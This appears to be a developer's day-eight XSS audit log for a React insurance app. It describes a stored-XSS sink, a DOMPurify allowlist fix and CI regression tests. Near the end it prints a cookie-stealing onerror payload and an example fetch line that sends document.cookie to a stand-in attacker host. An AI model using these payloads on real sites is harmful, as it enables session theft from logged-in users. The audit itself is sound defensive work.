# XSS audit - Day 8

Went through every place PolicyHub puts data on the page, looking for
anything that renders HTML from a string instead of letting React escape it.

## What I checked

Searched `src/` for the usual sinks: `dangerouslySetInnerHTML`, `innerHTML`,
`outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`,
and `href`/`src` built from data.

| Component              | Data rendered                     | How              | Safe? |
|------------------------|-----------------------------------|------------------|-------|
| PolicyCard             | name, status badge, premium       | JSX `{}`         | Yes, React escapes |
| PolicyList             | maps to PolicyCard                | JSX              | Yes   |
| PolicyDetailContainer  | name, status, premium             | JSX `{}`         | Yes   |
| PolicyDetailContainer  | **agent notes (new)**             | HTML             | Only through `PolicyNotes` / DOMPurify |
| PolicyListContainer    | error/loading text                | static strings   | Yes   |

Nothing on this branch was unsafe before today. Plain JSX `{value}` is
escaped by React, so `<img onerror>` in a policy *name* just shows up as text.

The real sink was in the old `jkeith/advanced-security` branch (PR #2, closed),
where `PolicyDetail.js` did this:

```jsx
<div className="agent-notes" dangerouslySetInnerHTML={{ __html: policy.notes }} />
```

Agent notes are rich text written by one person and read by another, so they
have to render as HTML. That is a stored XSS: whatever an agent account (or
anyone who can write to that field through the API) saves gets run in every
customer's browser that opens the policy.

## The fix

- `src/security/sanitizeHtml.js` - the one wrapper around `DOMPurify.sanitize`.
  It uses a strict allowlist: `p br strong b em i u ul ol li a`, and only the
  `href`/`title` attributes. No `img`, `svg`, `iframe`, `style`, forms, or
  inline styles. DOMPurify also removes every `on*` handler and blocks
  `javascript:`/`data:` URLs.
- `src/PolicyNotes.js` - a presentational component that is the only place in
  the app allowed to use `dangerouslySetInnerHTML`, and it always sanitizes
  first. `PolicyDetailContainer` renders it.

Rule going forward: if something needs to render HTML, it goes through
`sanitizeHtml`. Everything else stays as plain JSX.

## Regression tests (gate in CI)

`src/security/xss.security.test.js` runs in the `test` job, so it blocks the PR.

- 11 payloads (img onerror, script, svg onload, iframe srcdoc, javascript: and
  data: links, on* handlers on allowed tags, details ontoggle, malformed tags,
  style injection) rendered through `PolicyNotes`.
- One end-to-end case: the payload comes back from a mocked
  `fetchPolicyById` and is rendered by `PolicyDetailContainer`. This is the
  actual stored-XSS path.
- For each one: no dangerous tags, no `on*` or `style` attributes, no
  `javascript:`/`data:` hrefs. Then every common event is fired on every node
  and the test checks that `window.__xss()` was never called. Jest's jsdom
  runs inline handlers, so this checks that nothing executes, not just what
  the HTML looks like.
- Normal formatting (bold, links, lists) still renders, so the sanitizer
  isn't just deleting everything.

I also changed `ci.yml` to run on every PR. It was set to `branches: [main]`,
and since our PRs stack on day branches, the gate had never run on any of them.

## What breaks (sanitizer removed)

Temporarily changed `sanitizeHtml` to `return String(dirty)` and saved
`<img src=x onerror=alert(document.cookie)>` as a note:

- The alert fired. The probe test recorded `alert` being called with
  `document.cookie`.
- 13 of 21 tests in the security suite failed, including the end-to-end
  detail-view case. With the CI gate, that PR can't merge.
- `<body onload>` stayed inert even without the sanitizer, because the HTML
  parser drops a `<body>` tag inside a `<div>`. That's a reminder not to rely
  on the browser for this.

What that means for a real user: the script runs as PolicyHub, on PolicyHub's
origin, with the customer's logged-in session. `alert(1)` only proves it runs.
A real attacker would swap it for something like
`fetch('https://evil.example/?c=' + document.cookie)`. That steals any session
cookie not marked `HttpOnly`, reads tokens from `localStorage`, and calls our
API as the customer (change their contact details, beneficiaries, payout
account), or shows a fake "session expired, log in again" form. Because it's
*stored*, it hits every customer who opens that policy, not only someone who
clicks a bad link, and nothing looks wrong to them.


